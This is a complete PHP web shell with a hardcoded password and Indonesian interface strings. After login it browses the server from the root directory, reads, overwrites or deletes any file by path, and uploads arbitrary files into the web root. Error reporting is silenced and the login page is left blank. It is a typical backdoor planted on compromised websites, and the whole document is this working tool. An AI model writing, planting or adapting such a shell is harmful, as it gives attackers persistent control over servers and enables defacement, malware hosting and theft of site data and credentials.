<?php
session_start();
error_reporting(0);

$PASSWORD = 'dre4m1337'; // 

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}


if (!isset($_SESSION['login'])) {
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $PASSWORD) {
            $_SESSION['login'] = true;
            header("Location: ?");
            exit;
        } else {
            $error = "Password salah!";
        }
    }

    echo '<h3></h3>
    <form method="post">
        <input type="password" name="password">
        <div style="color:red;">'.($error ?? '').'</div>
    </form>';
    exit;
}

if (isset($_GET['up'])) {
    echo '<a href="?">⬅ Back</a><br><br>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload_file">
        <input type="submit" name="upload" value="Upload">
    </form>';
    exit;
}

if (isset($_POST['upload']) && $_FILES['upload_file']['error'] == 0) {
    $f = basename($_FILES['upload_file']['name']);
    $t = $_SERVER['DOCUMENT_ROOT'] . '/' . $f;
    move_uploaded_file($_FILES['upload_file']['tmp_name'], $t);
    die("Upload sukses: <a href='/$f'>$f</a>");
}

$p = isset($_GET['get']) ? $_GET['get'] : (isset($_POST['p']) ? $_POST['p'] : $_SERVER['DOCUMENT_ROOT']);

if (isset($_POST['action']) && $_POST['action'] == 'update') {
    file_put_contents($_POST['file'], $_POST['data']);
    die("<script>alert('Saved');history.back();</script>");
}

if (isset($_POST['action']) && $_POST['action'] == 'delete') {
    unlink($_POST['file']);
    die("<script>alert('Deleted');history.back();</script>");
}

echo '<a href="?up=1">Upload</a> | <a href="?logout=1">Logout</a><br><br>';

echo '<form method="post" id="fm">';
echo "<b>Path:</b> <a href='?get=/'>Root</a> " . htmlspecialchars($p) . "<br><br>";

if (is_dir($p)) {
    foreach (scandir($p) as $f) {
        if ($f === '.') continue;
        $fp = rtrim($p, '/') . '/' . $f;
        echo "<a href='?get=" . urlencode($fp) . "'>$f</a><br>";
    }
} else {
    echo "File: <input name='file' value='$p' size='60'>
        <button type='button' onclick=\"act('update')\">Save</button>
        <button type='button' onclick=\"act('delete')\">Delete</button><br>
        <textarea name='data' style='width:100%;height:300px'>".htmlspecialchars(file_get_contents($p))."</textarea>";
}

echo "<input type='hidden' name='p' value='$p'>
      <input type='hidden' name='action' id='action'>
      </form>";
?>

<script>
function act(a){
    document.getElementById('action').value = a;
    document.getElementById('fm').submit();
}
</script>
